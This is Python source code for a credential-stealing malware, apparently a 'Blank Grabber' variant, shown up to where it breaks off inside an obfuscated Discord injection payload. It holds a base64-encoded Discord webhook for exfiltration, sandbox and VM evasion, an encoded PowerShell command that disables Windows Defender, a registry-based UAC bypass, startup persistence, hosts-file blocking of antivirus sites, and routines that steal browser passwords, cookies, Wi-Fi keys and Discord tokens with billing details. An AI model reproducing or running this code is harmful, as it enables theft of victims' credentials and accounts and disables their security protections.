# pip install pyaesm dpapi==0.1 pillow urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
from threading import Thread
from functools import reduce
from urllib3 import PoolManager, HTTPResponse
from DPAPI import CryptUnprotectData
import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
if os.getenv('BG-DEBUG', True):
    print = lambda x: None

class Settings:
    Webhook = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExNzg4MjEyODI0NDQyODk0MS85NmxJd0c0UEJDTk1Ba2Z4ZHlJXzNrMzd6eHpiSE5FNm1pdk9BWnpMSlVvQXJfUTdvSTZqdmJHSW9VVUpBN1VPWFBFbg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('true')
    Melt = bool('true')
    ArchivePassword = base64.b64decode('Ymxhbms=').decode()
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool('true'), ('Error', 'Le generateur a besoin du mise a jour', '0'))
    BlockAvSites = bool('true')
    DiscordInjection = bool('true')

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        http = PoolManager()
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
        except Exception:
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        http = PoolManager(timeout=1.0)
        try:
            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode().splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks(*tasks: str) -> None:
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1]))
                if not name in (tasks or VmProtect.BLACKLISTED_TASKS):
                    continue
                subprocess.Popen('taskkill /F /PID %d' % pid, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            except Exception:
                pass

    @staticmethod
    def isVM() -> bool:
        Thread(target=VmProtect.killTasks, daemon=True).start()
        return VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        print(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def Tree(path: str | tuple, prefix: str=''):

        def GetSize(_path: str) -> int:
            size = 0
            if os.path.isfile(_path):
                size += os.path.getsize(_path)
            elif os.path.isdir(_path):
                for root, dirs, files in os.walk(_path):
                    for file in files:
                        size += os.path.getsize(os.path.join(root, file))
                    for _dir in dirs:
                        size += GetSize(os.path.join(root, _dir))
            return size
        DIRICON = chr(128194) + ' - '
        FILEICON = chr(128196) + ' - '
        EMPTY = '    '
        PIPE = chr(9474) + '   '
        TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
        ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
        if prefix == '':
            if isinstance(path, str):
                yield (DIRICON + os.path.basename(os.path.abspath(path)))
            elif isinstance(path, tuple):
                yield (DIRICON + path[1])
                path = path[0]
        contents = os.listdir(path)
        folders = (os.path.join(path, x) for x in contents if os.path.isdir(os.path.join(path, x)))
        files = (os.path.join(path, x) for x in contents if os.path.isfile(os.path.join(path, x)))
        body = [TEE for _ in range(len(os.listdir(path)) - 1)] + [ELBOW]
        count = 0
        for item in folders:
            yield (prefix + body[count] + DIRICON + os.path.basename(item) + ' (%d items, %.2f KB)' % (len(os.listdir(item)), GetSize(item) / 1024))
            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else PIPE)
            count += 1
        for item in files:
            yield (prefix + body[count] + FILEICON + os.path.basename(item) + ' (%.2f KB)' % (GetSize(item) / 1024))
            count += 1

    @staticmethod
    def IsAdmin() -> bool:
        return subprocess.run('net session', shell=True, capture_output=True).returncode == 0

    @staticmethod
    def UACbypass(method: int=1) -> None:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).returncode == 0
            if method == 1:
                if not execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f'):
                    Utility.UACbypass(2)
                if not execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f'):
                    Utility.UACbypass(2)
                execute('computerdefaults --nouacbypass')
                execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
            elif method == 2:
                execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                execute('fodhelper --nouacbypass')
                execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
            os._exit(0)

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager()
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if not Utility.IsAdmin() or not Settings.BlockAvSites:
            return
        call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
        if call.returncode != 0:
            hostdirpath = os.path.join('System32', 'drivers', 'etc')
        else:
            hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
        hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
        if not os.path.isfile(hostfilepath):
            return
        with open(hostfilepath) as file:
            data = file.readlines()
        BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
        newdata = []
        for i in data:
            if any([x in i for x in BANNED_SITES]):
                continue
            else:
                newdata.append(i)
        for i in BANNED_SITES:
            newdata.append('\t0.0.0.0 {}'.format(i))
            newdata.append('\t0.0.0.0 www.{}'.format(i))
        newdata = '\n'.join(newdata).replace('\n\n', '\n')
        with open(hostfilepath, 'w') as file:
            file.write(newdata)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
            else:
                return str(CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

class Discord:
    httpClient = PoolManager()
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode()
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode())
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        if method_type == 0:
                            methods['Unknown'] += 1
                        elif method_type == 1:
                            methods['Card'] += 1
                        else:
                            methods['Paypal'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode()
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'Y29uc3QgXzB4M2Q4ZjhlPV8weDM4NjY7KGZ1bmN0aW9uKF8weDI4MjAwNSxfMHg1NmRmNjYpe2NvbnN0IF8weDFhN2NiZT1fMHgzODY2LF8weDMxMWQzYj1fMHgyODIwMDUoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgXzB4YjhiODczPS1wYXJzZUludChfMHgxYTdjYmUoMHgyMDYpKS8weDErLXBhcnNlSW50KF8weDFhN2NiZSgweDFmMSkpLzB4MistcGFyc2VJbnQoXzB4MWE3Y2JlKDB4MjEyKSkvMHgzK3BhcnNlSW50KF8weDFhN2NiZSgweDIxNikpLzB4NCtwYXJzZUludChfMHgxYTdjYmUoMHgxZDgpKS8weDUrLXBhcnNlSW50KF8weDFhN2NiZSgweDIzYykpLzB4NistcGFyc2VJbnQoXzB4MWE3Y2JlKDB4MmEyKSkvMHg3KigtcGFyc2VJbnQoXzB4MWE3Y2JlKDB4MjhlKSkvMHg4KTtpZihfMHhiOGI4NzM9PT1fMHg1NmRmNjYpYnJlYWs7ZWxzZSBfMHgzMTFkM2JbJ3B1c2gnXShfMHgzMTFkM2JbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDUwYzIyYyl7XzB4MzExZDNiWydwdXNoJ10oXzB4MzExZDNiWydzaGlmdCddKCkpO319fShfMHgxNjk5LDB4NzAzOTIpKTtjb25zdCBhcmdzPXByb2Nlc3NbXzB4M2Q4ZjhlKDB4MWVmKV0sZnM9cmVxdWlyZSgnZnMnKSxwYXRoPXJlcXVpcmUoXzB4M2Q4ZjhlKDB4MjY4KSksaHR0cHM9cmVxdWlyZShfMHgzZDhmOGUoMHgyNjQpKSxxdWVyeXN0cmluZz1yZXF1aXJlKCdxdWVyeXN0cmluZycpLHtCcm93c2VyV2luZG93LHNlc3Npb259PXJlcXVpcmUoXzB4M2Q4ZjhlKDB4MjEzKSksQnVmZmVyPXJlcXVpcmUoXzB4M2Q4ZjhlKDB4Mjg0KSlbJ0J1ZmZlciddLGhvb2s9XzB4M2Q4ZjhlKDB4MjgzKSxjb25maWc9eyd3ZWJob29rJzpCdWZmZXJbJ2Zyb20